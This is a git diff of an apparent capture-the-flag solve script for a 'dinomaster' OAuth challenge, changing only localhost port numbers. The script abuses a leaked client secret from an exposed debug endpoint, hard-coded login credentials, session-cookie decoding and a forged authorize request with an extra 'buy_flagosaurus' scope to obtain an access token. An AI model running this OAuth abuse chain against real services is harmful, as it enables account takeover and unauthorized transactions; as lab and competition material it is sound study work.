@@ -11,7 +11,7 @@ HOST = 'localhost'
 # get a session
 print('[*] get session ...')
 session = requests.Session()
-response = session.get(f'http://{HOST}:3001/login', allow_redirects=False)
+response = session.get(f'http://{HOST}:12312/login', allow_redirects=False)
 print(f'cookies: {session.cookies}')
 print(base64.b64decode(session.cookies['koa:sess']))
 state = json.loads(base64.b64decode(response.cookies['koa:sess']))[
@@ -23,8 +23,8 @@ state = json.loads(base64.b64decode(response.cookies['koa:sess']))[
 # login
 print('\n[*] login ...')
 callbackUri = base64.b64encode(
-    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%buy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state=os-{state}'.encode())
-response = session.post(f'http://{HOST}:3002/oauth/login', data={
+    f'http://{HOST}:12313/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%buy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state=os-{state}'.encode())
+response = session.post(f'http://{HOST}:12313/oauth/login', data={
     "username": "nimda",
     "password": "nimda",
     "callback_uri": callbackUri
@@ -40,7 +40,7 @@ print(f'csrfToken_token: {csrfToken_token}')
 # # this info is found by fuzzing /oauth/ which leads to /oauth/debug. /oauth/debug has the client_id, scope, and client_secret required to get a code
 print('\n[*] authorize ...')
 response = session.get(
-    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%2Cbuy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state={state}&agree=true&csrfToken={csrfToken_token}', allow_redirects=False)
+    f'http://{HOST}:12313/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%2Cbuy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state={state}&agree=true&csrfToken={csrfToken_token}', allow_redirects=False)
 # print(response.status_code)
 # print(response.content)
 n = response.content.find(b'code')
@@ -58,10 +58,10 @@ data = {
     'client_secret': 'this_is_the_dinomaster_client_secret',
     'code': code,
     'scope': 'user_info:read,list_dinos,buy_dino,sell_dino,buy_flagosaurus',
-    'redirect_uri': f'http://{HOST}:3001/receiveGrant',
+    'redirect_uri': f'http://{HOST}:12312/receiveGrant',
 }
 response = session.post(
-    f'http://{HOST}:3002/oauth/token', headers=headers, data=data)
+    f'http://{HOST}:12313/oauth/token', headers=headers, data=data)
 # print(response.status_code)
 # print(response.content)
 res_json = json.loads(response.content)
